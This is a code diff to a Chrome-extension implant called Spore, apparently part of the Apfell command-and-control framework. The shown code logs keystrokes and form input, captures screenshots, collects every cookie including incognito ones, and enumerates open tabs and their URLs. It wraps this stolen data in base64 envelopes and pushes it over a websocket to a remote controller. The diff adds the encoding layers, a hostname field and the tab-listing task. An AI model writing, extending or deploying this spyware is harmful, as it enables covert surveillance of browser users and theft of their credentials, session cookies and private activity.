@@ -12,11 +12,11 @@ class SporeConfiguration {
         }
 
         this.apfellID = 0;
-        this.keyID = "";
         this.username = chrome.identity.getProfileUserInfo(function(userinfo){
             return userinfo.email;
         });
-        this.pid = chrome.instanceID.getID();
+        this.pid = 0;
+        this.hostname = chrome.instanceID.getID();
         this.UUID = uuid;
         // TODO: Add properties for the RSA and AES keys
     }
@@ -33,12 +33,13 @@ let keyloggers = [];
 /// TODO: Implement CreateKeyExchangeMessage function
 
 /// Create a Callback Checkin Message
-function CreateCallbackCheckInMessage(username, uuid, pid, addresses) {
+function CreateCallbackCheckInMessage(username, uuid, pid, addresses, hostname) {
     const msg = {};
     msg.user = username;
     msg.processid = pid;
     msg.uuid = uuid;
     msg.addresses = addresses;
+    msg.hostname = hostname;
 
     return msg;
 }
@@ -136,23 +137,42 @@ setInterval(function(){
                 break;
             }
             case 'keylogData' : {
-                let keylogMessage = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, message.data);
-                out.push(JSON.stringify(keylogMessage, null, 2));
+                const keydata = {};
+                keydata.user = config.username;
+                keydata.keystrokes = message.data;
+                let payload = btoa(JSON.stringify(keydata));
+                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, payload);
+                const meta = {};
+                meta.type = 3;
+                meta.metadata = envelope;
+                const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                out.push(metaenvelope);
                 break;
             }
             case 'formData' : {
-                let formCaptureMessage = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, message.data);
-                out.push(JSON.stringify(formCaptureMessage, null, 2));
+                const formData = {};
+                formData.user = config.username;
+                formData.keystrokes = message.data;
+                let payload = btoa(JSON.stringify(formData));
+                let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, payload);
+                const meta = {};
+                meta.type = 3;
+                meta.metadata = envelope;
+                const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                out.push(metaenvelope);
                 break;
             }
-
         }
     });
     
     connection.onopen = function() {
         console.log('Connection received');
         // TODO: Add code for creating a key message and then sending the message to the server
-        connection.send('init '+ ID);
+        const meta = {};
+        meta["metatype"] = 1;
+        meta["metadata"] = JSON.stringify({'keyid': ID});
+        const metaenvelope = btoa(JSON.stringify(meta));
+        connection.send(metaenvelope);
     };
     
     connection.onclose = function(){
@@ -165,15 +185,8 @@ setInterval(function(){
     
     // handle messages from other events
     connection.onmessage = function (e) {
-        // Message format
-        // MetaType
-        /// 1 - Key Exchange | 2 - Callback Checkin | Apfell Task Message
-        // MetaData
-        /// Key Exchange - {String : KeyID, Int : Stage, String : Key}
-        /// Callback Checkin - {String : KeyID, Int : PID, String : User, String : UUID, String : Host, String : IP}
-        /// Apfell Task Message
 
-        const message = JSON.parse(e.data);
+        const message = JSON.parse(atob(e.data));
         
         switch (message["metatype"]) {
             case 1 : {
@@ -188,13 +201,15 @@ setInterval(function(){
 
                 if (keyexchangedata["stage"] === 2) {
                     // Send the checkin data
-
-                    // We can use the unique device ID as a hostname since we can't retrieve the actual hostname
                     const localAddresses = GetLocalIP();
 
-                    const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses);
+                    const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses, config.hostname);
                     const envelope = JSON.stringify(checkInMessage, null, 2);
-                    out.push(envelope);
+                    const meta = {};
+                    meta.type = 2;
+                    meta.metadata = envelope;
+                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                    out.push(metaenvelope);
                 }
 
                 break;
@@ -219,7 +234,11 @@ setInterval(function(){
                         const encodedImage = btoa(unescape(encodeURIComponent(img.toString())));
                         const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encodedImage.length, taskid, tasktype, encodedImage);
                         const envelope = JSON.stringify(apfellmsg, null, 2);
-                        out.push(envelope);
+                        const meta = {};
+                        meta.type = 3;
+                        meta.metadata = envelope;
+                        const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                        out.push(metaenvelope);
                     });
                 } else if (tasktype === 2) {
                     // Keylog
@@ -241,6 +260,16 @@ setInterval(function(){
                             }
                         }
                     });
+
+
+                    const started = btoa(JSON.stringify({'status': 'started'}));
+                    const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
+                    const envelope = JSON.stringify(apfellmsg, null, 2);
+                    const meta = {};
+                    meta.type = 3;
+                    meta.metadata = envelope;
+                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                    out.push(metaenvelope);
                 } else if (tasktype === 3) {
                     // Get all cookies. Includes incognito cookies
                     let results = [];
@@ -254,12 +283,42 @@ setInterval(function(){
                         });
                     });
 
-                    const data = JSON.stringify(results, null, 2);
+                    const data = btoa(JSON.stringify(results, null, 2));
                     const envelope = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
-                    out.push(envelope);
+                    const meta = {};
+                    meta.type = 3;
+                    meta.metadata = envelope;
+                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                    out.push(metaenvelope);
 
                 } else if (tasktype === 4) {
                     // TODO: Implement task code for setting a cookie value
+                } else if (tasktype === 5) {
+                    // TODO: List all open tabs with window titles
+                    const queryInfo = {};
+                    let tabs =[];
+                    chrome.tabs.query(queryInfo, function(result){
+                        for (i = 0; i < result.length; i++) {
+                            const individualTab = {};
+                            individualTab.window = result[i].title;
+                            individualTab.url = result[i].url;
+                            individualTab.incognito = result[i].incognito;
+                            individualTab.id = result[i].id;
+                            individualTab.active = result[i].active;
+                            individualTab.highlighted = result[i].highlighted;
+                            individualTab.windowid = result[i].windowId;
+
+                            tabs.push(individualTab);
+                        }
+                    });
+
+                    const data = btoa(JSON.stringify(tabs, null, 2));
+                    const envelope = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                    const meta = {};
+                    meta.type = 3;
+                    meta.metadata = envelope;
+                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
+                    out.push(metaenvelope);
                 }
             }
         }
